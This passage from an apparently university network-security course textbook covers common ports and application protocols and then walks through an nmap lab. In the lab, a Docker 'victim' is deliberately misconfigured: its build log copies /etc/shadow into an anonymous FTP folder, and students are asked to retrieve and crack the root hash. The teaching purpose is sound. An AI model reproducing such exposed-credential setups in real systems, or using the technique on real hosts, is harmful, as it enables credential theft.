Registered ports range from 1024 to 49151 and do not require administrative privileges to run a service on.
You may find many things listening on these ports as any user can have a service on them.
Lastly ports 49152 to 65535 are used dynamically by applications as needed.</p>
</div>
<div class="paragraph">
<p>It is important to know some commonly used ports as the services running on these ports may be subject to an attack.
When scanning a machine, only necessary ports should be open.</p>
</div>
<table class="tableblock frame-all grid-all stretch">
<colgroup>
<col style="width: 33.3333%;">
<col style="width: 33.3333%;">
<col style="width: 33.3334%;">
</colgroup>
<thead>
<tr>
<th class="tableblock halign-left valign-top">Port Number</th>
<th class="tableblock halign-left valign-top">L4 Protocol</th>
<th class="tableblock halign-left valign-top">Usage</th>
</tr>
</thead>
<tbody>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">20</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">TCP</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">File Transfer Protocol (FTP) Data Transfer</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">21</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">TCP</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">FTP Command Control</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">22</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">TCP</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Secure Shell (SSH)</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">23</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">TCP</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Telnet Remote Login Service</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">25</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">TCP</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Simple Mail Transfer Protocol (SMTP) E-Mail</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">53</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">TCP, UDP</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Domain Name System (DNS)</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">67, 68</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">UDP</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Dynamic Host Configuration Protocol (DHCP)</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">69</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">UDP</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Trivial File Transfer Protocol (TFTP)</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">80</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">TCP</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Hypertext Transfer Protocol (HTTP)</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">110</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">TCP</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Post Office Protocol (POP3) E-Mail</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">119</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">TCP, UDP</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Network News Transfer Protocol (NNTP)</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">123</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">UDP</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Network Time Protocol (NTP)</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">137-139</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">TCP, UDP</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">NetBIOS</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">143</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">TCP</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Internet Message Access Protocol (IMAP) E-Mail</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">161, 162</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">TCP, UDP</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Simple Network Management Protocol (SNMP)</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">194</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">TCP, UDP</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Internet Relay Chat (IRC)</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">389</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">TCP, UDP</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Lightweight Directory Access Protocol (LDAP)</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">443</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">TCP</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">HTTP Secure (HTTPS) HTTP over TLS/SSL</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">3389</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">TCP, UDP</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Microsoft Terminal Server (RDP)</p></td>
</tr>
</tbody>
</table>
</div>
</div>
<div class="sect2">
<h3 id="_application_layer_protocols">4.4. Application Layer Protocols</h3>
<div class="sect3">
<h4 id="_dhcp">4.4.1. DHCP</h4>
<div class="paragraph">
<p>Dynamic Host Configuration Protocol (DHCP) is used to allow new clients on a network to obtain an IP address and information about services provided.
IPv4 addresses can be thought of as being in two groups: static addresses and dynamic addresses.
Dynamic addresses are distributed by a DHCP server for a particular lease time.
When the time is up, the DHCP server may distribute the address to another client.
DHCP servers can also give information about proxies, Domain Name Servers (DNS), gateways and even where to get a <a href="https://en.wikipedia.org/wiki/Preboot_Execution_Environment">where to get a kernel to boot an OS over the network!</a></p>
</div>
<div class="paragraph">
<p>Given the dynamic nature of modern networks, with clients coming and going, DHCP is the standard.
From a security standpoint someone impersonating a DHCP server can wreak havoc on a network.
These rogue DHCP servers can cause traffic to be redirected to initiate MitM attacks or cause DoS attacks.
DHCP relies on broadcast Address Resolution Protocol (ARP) messages and does not make use of authentication, meaning that once an attacker is on the same Ethernet segment as the victim machines all bets are off.</p>
</div>
</div>
<div class="sect3">
<h4 id="_http">4.4.2. HTTP</h4>
<div class="paragraph">
<p>Hypertext Transfer Protocol (HTTP) is a text based protocol that governs how web traffic moves.
It is built on the concept of a <em>request</em> and a <em>response</em>.
A typical request has an <em>method</em> and a <em>path</em>, such as <code>GET /index.html</code> which would retrieve the landing page of a website.
Responses have a code, message, and optionally data.
Some standard responses are shown below:</p>
</div>
<table class="tableblock frame-all grid-all stretch">
<colgroup>
<col style="width: 50%;">
<col style="width: 50%;">
</colgroup>
<thead>
<tr>
<th class="tableblock halign-left valign-top">Code</th>
<th class="tableblock halign-left valign-top">Message</th>
</tr>
</thead>
<tbody>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">200</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">OK</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">202</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Accepted</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">400</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Bad Request</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">401</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Unauthorized</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">403</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Forbidden</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">404</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Not Found</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">500</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Internal Server Error</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">502</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Bad Gateway</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">503</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Service Unavailable</p></td>
</tr>
</tbody>
</table>
<div class="paragraph">
<p>Both requests and responses can take advantage of <em>headers</em>, arbitrary lines of text following the initial request or response.
Since headers were designed to be open-ended, many new headers have been added over time.
A modern web request/response usually has far more information in the headers than just the basics defined in HTTP 1.1.
Unencrypted HTTP traffic is sent over port 80 and is vulnerable to attack as all information is sent in cleartext.</p>
</div>
</div>
<div class="sect3">
<h4 id="_ssltls">4.4.3. SSL/TLS</h4>
<div class="openblock float-group">
<div class="content">
<div class="imageblock left">
<div class="content">
<img src="images/tls.svg" alt="tls" width="250" height="432">
</div>
</div>
<div class="paragraph">
<p>Secure Sockets Layer (SSL) or the more modern nomenclature Transport Layer Security (TLS) is a protocol that allows cleartext protocols used on the web to be encrypted.
It is a general purpose protocol, designed as a layer through which other protocols communicate.
Some protocols typically wrapped in TLS include HTTP, SMTP, IMAP, VoIP, and many VPN protocols.
TLS uses a handshake to exchange certificate information as shown in the diagram.
It should be noted that at the time of writing TLS 1.3 is the most current version, but only half of websites support it.
TLS 1.2, the most common version, is still considered safe if best practices are followed and TLS 1.1 or lower is considered depreciated.</p>
</div>
</div>
</div>
</div>
<div class="sect3">
<h4 id="_https">4.4.4. HTTPS</h4>
<div class="imageblock right">
<div class="content">
<a class="image" href="https://commons.wikimedia.org/wiki/File:HTTPS_icon.png"><img src="images/https.png" alt="https" width="300"></a>
</div>
</div>
<div class="paragraph">
<p>Hypertext Transfer Protocol Secure (HTTPS) solves the problem of unencrypted traffic by wrapping HTTP requests in TLS.
HTTPS traffic uses port 443 and is typically signified in a browser with a lock icon in the upper left-hand corner.
By clicking on the icon users can learn more about the certificates being used for communication.
Utilizing a robust PKI HTTPS allows for safe HTTP communication between client and server.</p>
</div>
</div>
<div class="sect3">
<h4 id="_rdp">4.4.5. RDP</h4>
<div class="paragraph">
<p>Remote Desktop Protocol (RDP) is build into Windows and is typically used to control a machine remotely.
It works over port 3389 via TCP or UDP.
While RDP can be quite useful for performing remote administration on a remote machine, it can also be a large security hole if a bad actor gains access.
RDP use in ransomware attacks is on the rise as ransomware programs may use RDP to find other machines to attack.</p>
</div>
</div>
<div class="sect3">
<h4 id="_telnet">4.4.6. Telnet</h4>
<div class="paragraph">
<p>Telnet is an antiquated remote administration tool that gives access to a shell via a cleartext channel.
Telnet runs on port 23 and while still occasionally in use it should largely be phased out.
You will still find telnet in embedded applications and legacy systems.
You may also see the client being used to inspect other types of traffic.
For example, you can use a telnet client to submit HTTP requests or send email via SMTP.</p>
</div>
</div>
<div class="sect3">
<h4 id="_ssh">4.4.7. SSH</h4>
<div class="paragraph">
<p>Secure Shell (SSH) is the most widely deployed remote administration tool.
SSH provides access to a shell via an encrypted connection.
SSH supports many options including SOCKS5 proxies, port forwarding, and the usage of multiple authentication schemes: password, key, hardware device, etc.
SSH uses TCP on port 22.</p>
</div>
</div>
<div class="sect3">
<h4 id="_ldap">4.4.8. LDAP</h4>
<div class="imageblock right">
<div class="content">
<img src="images/ldap.svg" alt="ldap" width="400" height="304">
</div>
</div>
<div class="paragraph">
<p>Lightweight directory access protocol (LDAP) is used for accessing and maintaining directory information services.
It&#8217;s primary use is with Windows Active Directory (AD) where it can be used to obtain information regarding users and resources from an AD server.
Clients can authenticate through the server and obtain privileges to read or read/write certain entries.
LDAP did not originally support encryption, so LDAP over SSL (LDAPS) was developed.
LDAP uses TCP and UPD over port 389 and LDAPS uses TCP over port 636.</p>
</div>
</div>
<div class="sect3">
<h4 id="_dns">4.4.9. DNS</h4>
<div class="paragraph">
<p>Domain Name System (DNS) is used to resolve domain names to IP addresses.
Domain names are the simple names people are accustomed to for websites, such as <code>njit.edu</code> as opposed to <code>54.83.189.142</code>.
Names are significantly easier for people to remember than IP addresses.
In order for a computer to resolve a name, it first queries a local cache, then its primary DNS server.
Assuming the DNS server cannot find the name it will query a Root server for a Top Level Domain (TLD) server, which maintains a listing of Authoritative Nameservers for that particular domain (edu, com, net, org, gov, etc.).
Finally once an authoritative nameserver is found it will respond with the IP address for that particular hostname which will be cached and sent back through the user&#8217;s primary DNS server to the user.</p>
</div>
<div class="paragraph">
<p>DNS is designed to be resilient and decentralized but unfortunately the traffic is not authenticated or encrypted.
This has made it a target for MitM attacks.
Likewise cache hits and misses <a href="https://kb.isc.org/docs/aa-00509">can yield information as to what names have been recently resolved</a> (as was the case in discovering the extent of the Sony Rootkit).
The recursive nature has of DNS has also allowed for DoS attacks in the past, but much of that has been solved by limiting recursive queries to the user-facing DNS servers (ie. the one given to you by your DHCP request).
DNS operates via UDP (and occasionally TCP) on port 53.</p>
</div>
</div>
<div class="sect3">
<h4 id="_dnssec">4.4.10. DNSSEC</h4>
<div class="paragraph">
<p>Domain Name System Security Extensions (DNSSEC) is a suite of extension specifications designed to authenticate responses to domain name lookups.
This can help prevent MitM attacks by checking the digital signature of the responding server.
While this is certainly helpful, it is important to note that DNSSEC does not provide confidentiality.
DNS resolutions can still be monitored by anyone who has access to the traffic.</p>
</div>
</div>
<div class="sect3">
<h4 id="_imappop3">4.4.11. IMAP/POP3</h4>
<div class="paragraph">
<p>Internet Message Access Protocol (IMAP) and Post Office Protocol 3 (POP3) are two protocols used to retrieve email from a server.
IMAP is the more recent protocol which supports saving mail on the sever and folders.
POP3 is more primitive, supporting only the retrieval (and subsequent deletion from the server) of emails.
Both protocols use cleartext and are now commonly run over TLS.
POP3 defaults to TCP port 110 or 995 if using TLS.
IMAP defaults to TCP port 143 or 993 if using TLS.
In the age of webmail it is easy to forget about these protocols, but a security specialist must keep them in mind as they may still be used in support of corporate devices.</p>
</div>
</div>
<div class="sect3">
<h4 id="_smtp">4.4.12. SMTP</h4>
<div class="paragraph">
<p>Simple Mail Transfer Protocol is used for sending/forwarding email.
As it states, it is a simple protocol consisting of lines of text.
Basic SMTP used TCP on port 25.
SMTP was later expanded to support authentication and finally wrapped in TLS still using TCP on port 587.
SMTP servers accept outgoing mail from (hopefully) authenticated clients, route mail to other SMTP servers based on the Mail Exchange (MX) information in DNS records, and accept mail for their domain from other SMTP servers.
Various checks have been implemented in SMTP servers to ensure that messages from domains <em>actually</em> come from those domains.
This is largely used to combat spam, which continues to be a problem.</p>
</div>
</div>
<div class="sect3">
<h4 id="_ntp">4.4.13. NTP</h4>
<div class="paragraph">
<p>Network Time Protocol uses UDP over port 123 to sync the system time with a time server.
NTP servers are layered in stratums, with the lowest stratums being closest to the most accurate sources of time, atomic clocks, GPS, etc.
NTP is important as many protocols, including several key exchanges, require system clocks to be in sync.
System clocks are also used to check when certificates expire and used in logs to indicate when something happened.
Without an accurate, synchronized system clock many things will fail in surprising ways.</p>
</div>
</div>
<div class="sect3">
<h4 id="_ftp">4.4.14. FTP</h4>
<div class="paragraph">
<p>File Transfer Protocol is a relatively simple, text-based protocol for sending files between machines.
FTP uses TCP on port 21 and traditionally establishes two channels: one for protocol messages, and one binary channel for data.
The interesting thing about this setup is that the FTP server would initiate the connection of the data channel from server to client, meaning that in many NAT situations where the client couldn&#8217;t be easily reached behind a firewall it would fail.
The solution to this problem was passive FTP which uses one channel established by the client.</p>
</div>
<div class="paragraph">
<p>Despite this initial shortcoming, FTP has proven to be incredibly popular and is still used in many corporate environments.
You may see FTP being used to transmit bulk data for import to systems or used to update firmware in embedded systems.
You can use FTP with a commandline client, <code>ftp</code>, a graphical client such as Filezilla or SecureFX, or even in most web browsers with the <code>ftp://</code> URL scheme.</p>
</div>
<div class="paragraph">
<p>Unfortunately FTP does not support authentication systems other than passwords and the passwords are sent in plaintext.
As such Secure FTP (SFTP) is recommended.
SFTP uses an SSH connection to send and receive files over an encrypted channel.
SFTP also supports all SSH authentication methods.</p>
</div>
</div>
<div class="sect3">
<h4 id="_snmp">4.4.15. SNMP</h4>
<div class="openblock float-group">
<div class="content">
<div class="imageblock left">
<div class="content">
<a class="image" href="https://commons.wikimedia.org/wiki/File:SNMP_TRAFFIC1.png"><img src="images/snmp.png" alt="snmp" width="400"></a>
</div>
</div>
<div class="paragraph">
<p>Simple Network Management Protocol is used for gathering information about the workings of a network.
It is broken into two groups: clients using UDP port 161 (TLS 10161) and a manager using UDP port 162 (TLS 10162).
The manager collects messages from the clients regarding the operations of the network and uses this information to take actions as necessary.
SNMP can be used to pass information about the temperature of a machine, how many connections it currently has, the channel capacity currently being utilized, etc.
SNMP is currently up to version 3 which is encrypted and requires authentication.
This is particularly important because SNMP is a very powerful protocol which exchanges information that could potentially be very valuable to an attacker.
Access to SNMP should be limited and its usage on a network should be monitored.</p>
</div>
</div>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_review_4">4.5. Review</h3>
<div class="sect3">
<h4 id="_labs_4">4.5.1. Labs</h4>
<div class="openblock lab">
<div class="title">Scanning with nmap</div>
<div class="content">
<div class="paragraph">
<p>For this lab we will start by downloading and extracting the files required.
Download <a href="https://github.com/rxt1077/it230/raw/main/labs/nmap.zip">nmap.zip</a> and extract it to a directory you can access from the shell.
Open a shell in that directory (it should have a <code>docker-compose.yml</code> in it and a <code>victim</code> and <code>scanner</code> directory).
Since we will be simulating multiple machines in this lab, we will make use of Docker Compose which was already installed with Docker.
Docker Compose reads a <code>docker-compose.yml</code> file which should already be in your <code>nmap</code> directory.
Run <code>docker-compose up --build --detach</code> to build and run the images in the background:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-console" data-lang="console">PS C:\Users\rxt1077\temp\nmap&gt; docker-compose up --build --detach
Building victim
[+] Building 2.9s (15/15) FINISHED
 =&gt; [internal] load build definition from Dockerfile                                                                                                   0.1s
 =&gt; =&gt; transferring dockerfile: 518B                                                                                                                   0.0s
 =&gt; [internal] load .dockerignore                                                                                                                      0.1s
 =&gt; =&gt; transferring context: 2B                                                                                                                        0.0s
 =&gt; [internal] load metadata for docker.io/library/debian:latest                                                                                       0.0s
 =&gt; [ 1/10] FROM docker.io/library/debian                                                                                                              0.0s
 =&gt; [internal] load build context                                                                                                                      0.0s
 =&gt; =&gt; transferring context: 640B                                                                                                                      0.0s
 =&gt; CACHED [ 2/10] RUN apt-get -y update                                                                                                               0.0s
 =&gt; CACHED [ 3/10] RUN apt-get -y install proftpd-basic                                                                                                0.0s
 =&gt; CACHED [ 4/10] RUN sed -i "1s/.*/root:$6$.DEC7ti\/4959zEK9$H7BPwBTz6tISYG8oZuhXLS5L3ZPYwdzzQNQTg8m4Ql3ebX9U\/afVhi4OSpK3mNTSpT8DefJ2USdWuT5DHOkRY  0.0s
 =&gt; [ 5/10] RUN sed -i "/^root/d" /etc/ftpusers                                                                                                        0.4s
 =&gt; [ 6/10] COPY bad.conf /etc/proftpd/conf.d/                                                                                                         0.0s
 =&gt; [ 7/10] RUN chsh -s /bin/bash ftp                                                                                                                  0.6s
 =&gt; [ 8/10] RUN mkdir -p /home/ftp/incoming                                                                                                            0.5s
 =&gt; [ 9/10] RUN cp /etc/shadow /home/ftp/incoming/shadow.backup                                                                                        0.6s
 =&gt; [10/10] RUN chown -R ftp.users /home/ftp                                                                                                           0.5s
 =&gt; exporting to image                                                                                                                                 0.2s
 =&gt; =&gt; exporting layers                                                                                                                                0.2s
 =&gt; =&gt; writing image sha256:dc9af53b250b4f7fcfbe5a6668a540bd02ebef0353c5927ed4591a512363e831                                                           0.0s
 =&gt; =&gt; naming to docker.io/library/nmap_victim                                                                                                         0.0s

Use 'docker scan' to run Snyk tests against images to find vulnerabilities and learn how to fix them
Building scanner
[+] Building 0.1s (7/7) FINISHED
 =&gt; [internal] load build definition from Dockerfile                                                                                                   0.0s
 =&gt; =&gt; transferring dockerfile: 111B                                                                                                                   0.0s
 =&gt; [internal] load .dockerignore                                                                                                                      0.0s
 =&gt; =&gt; transferring context: 2B                                                                                                                        0.0s
 =&gt; [internal] load metadata for docker.io/library/debian:latest                                                                                       0.0s
 =&gt; [1/3] FROM docker.io/library/debian                                                                                                                0.0s
 =&gt; CACHED [2/3] RUN apt-get -y update                                                                                                                 0.0s
 =&gt; CACHED [3/3] RUN apt-get -y install nmap ftp john                                                                                                  0.0s
 =&gt; exporting to image                                                                                                                                 0.0s
 =&gt; =&gt; exporting layers                                                                                                                                0.0s
 =&gt; =&gt; writing image sha256:14ba503b7925089023184d783c53c22c4167fdf2338df0e85143daedf8b458ac                                                           0.0s
 =&gt; =&gt; naming to docker.io/library/nmap_scanner                                                                                                        0.0s

Use 'docker scan' to run Snyk tests against images to find vulnerabilities and learn how to fix them
Starting nmap_scanner_1  ... done
Recreating nmap_victim_1 ... done</code></pre>
</div>
</div>
<div class="paragraph">
<p>Now we actually have to containers running, one named <code>victim</code> which is our target machine and another named <code>scanner</code> which we will use to learn about nmap.
Lets start a BASH shell on <code>scanner</code> and work from there:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-console" data-lang="console">PS C:\Users\rxt1077\temp\nmap&gt; docker-compose run scanner bash
Creating nmap_scanner_run ... done
root@7b6d733cc03a:/<i class="conum" data-value="1"></i><b>(1)</b></code></pre>
</div>
</div>
<div class="colist arabic">
<table>
<tr>
<td><i class="conum" data-value="1"></i><b>1</b></td>
<td>Notice the prompt change. We are now <em>inside</em> the <code>scanner</code> container running BASH.</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>Lets use the Linux <code>ip addr</code> command to see what our IP address on this network is:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-console" data-lang="console">root@7b6d733cc03a:/# ip addr
1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: tunl0@NONE: &lt;NOARP&gt; mtu 1480 qdisc noop state DOWN group default qlen 1000
    link/ipip 0.0.0.0 brd 0.0.0.0
3: sit0@NONE: &lt;NOARP&gt; mtu 1480 qdisc noop state DOWN group default qlen 1000
    link/sit 0.0.0.0 brd 0.0.0.0
165: eth0@if166: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:ac:14:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.20.0.2/16 brd 172.20.255.255 scope global eth0
       valid_lft forever preferred_lft forever</code></pre>
</div>
</div>
<div class="paragraph">
<p>We care about the <code>eth0</code> device, so as you can see on my machine the address is <code>172.20.0.2</code>.
We will use nmap&#8217;s ping scan to search for any device within the last 8 bits of our IP address (<code>/24</code>).
You may notice that we are actually on a <code>/16</code> subnet, but by limiting ourselves to <code>/24</code> the scan will go <em>much</em> faster.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-console" data-lang="console">root@7b6d733cc03a:/# nmap -sP 172.20.0.0/24
Starting Nmap 7.70 ( https://nmap.org ) at 2021-09-22 20:25 UTC
Nmap scan report for 172.20.0.1
Host is up (0.000076s latency).
MAC Address: 02:42:A6:CA:0D:77 (Unknown)
Nmap scan report for nmap_victim_1.nmap_default (172.20.0.3)
Host is up (0.000070s latency).
MAC Address: 02:42:AC:14:00:03 (Unknown)
Nmap scan report for 7b6d733cc03a (172.20.0.2)
Host is up.
Nmap done: 256 IP addresses (3 hosts up) scanned in 5.78 seconds</code></pre>
</div>
</div>
<div class="paragraph">
<p>In this instance we found three other machines on the network.
One of which is conveniently named victim.</p>
</div>
<div class="admonitionblock important deliverable">
<table>
<tr>
<td class="icon">
<i class="fa icon-important" title="Important"></i>
</td>
<td class="content">
<div class="paragraph">
<p><a href="https://nmap.org/book/man-host-discovery.html">Read the nmap documentation for host discovery.</a>
What other types of scans could you use if a host does not respond to an ICMP ping packet?</p>
</div>
</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>Now lets do a full scan on on the victim machine.
Docker Compose does a nice job of resolving DNS requests for sensible names in the <code>docker-compose.yml</code> file so we can refer to the host we want to scan as <code>victim</code>.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-console" data-lang="console">root@7b6d733cc03a:/# nmap victim
Starting Nmap 7.70 ( https://nmap.org ) at 2021-09-22 20:37 UTC
Nmap scan report for victim (172.20.0.3)
Host is up (0.000018s latency).
rDNS record for 172.20.0.3: nmap_victim_1.nmap_default
Not shown: 999 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
MAC Address: 02:42:AC:14:00:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 1.84 seconds</code></pre>
</div>
</div>
<div class="paragraph">
<p>By default, nmap uses a <a href="https://www.techtarget.com/searchnetworking/definition/SYN-scanning">SYN</a> scan against well known ports.
This type of scan is harder to detect (as it does not fully open a connection) and can be run quickly.</p>
</div>
<div class="admonitionblock important deliverable">
<table>
<tr>
<td class="icon">
<i class="fa icon-important" title="Important"></i>
</td>
<td class="content">
<div class="paragraph">
<p>What ports are open on the victim machine? Why is <em>this</em> particular protocol insecure?</p>
</div>
</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>nmap is capable of much more than just simple port scanning.
nmap includes version detection and OS fingerprinting (among other things).
To get a much better picture of what exactly <code>victim</code> is running, you can use the <code>-A</code> option:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-console" data-lang="console">root@7b6d733cc03a:/# nmap -A victim
Starting Nmap 7.70 ( https://nmap.org ) at 2021-09-22 20:44 UTC
Nmap scan report for victim (172.20.0.3)
Host is up (0.000096s latency).
rDNS record for 172.20.0.3: nmap_victim_1.nmap_default
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x   1 ftp      users        4096 Sep 22 20:11 incoming
MAC Address: 02:42:AC:14:00:03 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.70%E=4%D=9/22%OT=21%CT=1%CU=44136%PV=Y%DS=1%DC=D%G=Y%M=0242AC%T
OS:M=614B95AE%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=109%TI=Z%CI=Z%TS=A
OS:)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B
OS:4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88
OS:)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+
OS:%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
OS:T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A
OS:=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%D
OS:F=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=4
OS:0%CD=S)

Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.10 ms nmap_victim_1.nmap_default (172.20.0.3)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.39 seconds</code></pre>
</div>
</div>
<div class="admonitionblock important deliverable">
<table>
<tr>
<td class="icon">
<i class="fa icon-important" title="Important"></i>
</td>
<td class="content">
<div class="paragraph">
<p>What additional information did you learn from the <code>-A</code> option?
How do you think this could be exploited?</p>
</div>
</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>Now, using the <code>scanner</code> container you are currently on see what you can find out about <code>victim</code>.
<a href="https://linux.die.net/man/1/ftp">This man page may be of some help.</a></p>
</div>
<div class="admonitionblock important deliverable">
<table>
<tr>
<td class="icon">
<i class="fa icon-important" title="Important"></i>
</td>
<td class="content">
<div class="paragraph">
<p>BONUS: Remembering what you learned in the <em>Hash it Out</em> lab, what is the root password on the victim machine?</p>
</div>
</td>
</tr>
</table>
</div>
<div class="admonitionblock important deliverable">
<table>
<tr>
<td class="icon">
<i class="fa icon-important" title="Important"></i>
</td>
<td class="content">
<div class="paragraph">
<p>BONUS: How can you test to see if you got it right? What does this say about how ProFTP is configured on <code>victim</code>?</p>
</div>
</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>When you are all done poking around, you can exit the shell and run <code>docker-compose down</code> to stop <code>victim</code> from running in the background.</p>
</div>
</div>
</div>
</div>
<div class="sect3">
<h4 id="_questions_4">4.5.2. Questions</h4>
<div class="qlist qanda">
<ol>
<li>
<p><em>Compare and contrast SSH and Telnet. If you had to make a recommendation for which one to use, what would you choose and why?</em></p>
<p></p>
</li>
<li>
<p><em>What are some security concerns associated with ARP? What steps can be taken to mitigate them?</em></p>
<p></p>
</li>
<li>
<p><em>Describe three protocols used to send or receive email.</em></p>
<p></p>
</li>
